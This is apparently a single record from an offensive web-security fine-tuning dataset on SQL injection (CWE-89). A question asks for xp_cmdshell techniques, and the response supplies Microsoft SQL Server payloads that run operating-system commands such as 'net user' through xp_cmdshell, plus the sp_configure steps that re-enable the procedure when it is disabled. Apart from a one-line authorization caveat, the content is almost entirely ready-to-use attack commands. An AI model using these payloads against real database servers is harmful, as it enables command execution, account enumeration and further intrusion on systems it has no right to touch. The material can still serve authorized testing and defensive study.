# SQLI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: sqli
- cwe: CWE-89

## Scenario

What payloads and steps should I use for XP_CMDSHELL when working on SQL Injection?

## Analysis / Response

**XP_CMDSHELL** — this technique applies to SQL Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

`xp_cmdshell` is a system stored procedure in Microsoft SQL Server that allows you to run operating system commands directly from within T-SQL (Transact-SQL).

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

If you need to reactivate `xp_cmdshell`, it is disabled by default in SQL Server 2005.

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```
